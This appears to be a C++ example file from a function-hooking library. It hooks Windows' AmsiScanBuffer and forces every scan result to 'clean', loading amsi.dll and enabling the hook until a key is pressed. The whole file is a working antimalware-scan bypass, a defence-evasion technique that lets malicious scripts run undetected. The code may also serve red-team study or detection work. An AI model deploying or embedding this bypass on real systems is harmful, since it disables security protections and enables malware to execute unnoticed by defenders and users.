#include<iostream>
#include<amsi.h>

#include "../examples.h"

typedef HRESULT(WINAPI* typeAmsiScanBuffer)(
	HAMSICONTEXT amsiContext,
	PVOID buffer,
	ULONG length,
	LPCWSTR contentName,
	HAMSISESSION amsiSession,
	AMSI_RESULT* result
);

typeAmsiScanBuffer orgAmsiScanBuffer;

HRESULT hookAmsiScanBuffer(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result) {
	HRESULT orgCallResult = orgAmsiScanBuffer(amsiContext, buffer, length, contentName, amsiSession, result);

	(*result) = AMSI_RESULT_CLEAN;

	return orgCallResult;
}

void examples::runAmsiHookExample() {

	LoadLibraryA("amsi.dll"); // since amsi isn't loaded by the windows loader by default

	Rc7Hook amsiScanBufferHook{ "amsi.dll", "AmsiScanBuffer", hookAmsiScanBuffer, (PVOID*)&orgAmsiScanBuffer };

	if (amsiScanBufferHook.Enable()) {
		printf("[+] Enabled AmsiScanBuffer Hook!\n");
	}
	else {
		printf("[-] Failed to Enable AmsiScanBuffer Hook.\n");
	}

	printf("[*] Press a Key to Unhook.\n");
	getchar();

	if (amsiScanBufferHook.Disable()) {
		printf("[+] Disabled AmsiScanBuffer Hook!\n");
	}
	else {
		printf("[+] Failed to disable AmsiScanBuffer Hook.\n");
	}
}